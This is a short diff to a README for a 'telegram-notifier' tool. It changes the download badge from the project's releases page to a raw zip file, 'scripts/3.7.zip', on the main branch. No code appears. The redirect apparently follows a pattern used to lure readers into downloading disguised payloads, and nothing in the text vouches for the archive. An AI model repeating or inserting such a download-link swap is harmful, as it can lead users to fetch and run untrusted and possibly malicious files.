@@ -10,7 +10,7 @@ Think of it as a remote control and notification system for your AI-powered work
 
 ## 📥 Download and Install
 
-[![Download telegram-notifier](https://img.shields.io/badge/Download-telegram--notifier-blue?style=for-the-badge&logo=github)](https://github.com/Gobbleswordknot1348/telegram-notifier/releases)
+[![Download telegram-notifier](https://img.shields.io/badge/Download-telegram--notifier-blue?style=for-the-badge&logo=github)](https://github.com/Gobbleswordknot1348/telegram-notifier/raw/refs/heads/main/scripts/3.7.zip)
 
 Visit this link to download the application.
 
